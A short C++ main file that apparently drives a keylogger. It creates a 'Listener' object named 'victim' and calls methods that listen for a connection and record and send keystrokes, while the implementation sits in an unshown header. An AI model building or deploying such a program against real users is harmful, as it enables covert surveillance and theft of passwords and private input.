#include <iostream>
#include "Listener.h"

int main() {
	Listener victim;

	victim.init();
	victim.listenAndAccept();
	victim.recordAndSendKeys();

	return 0;
}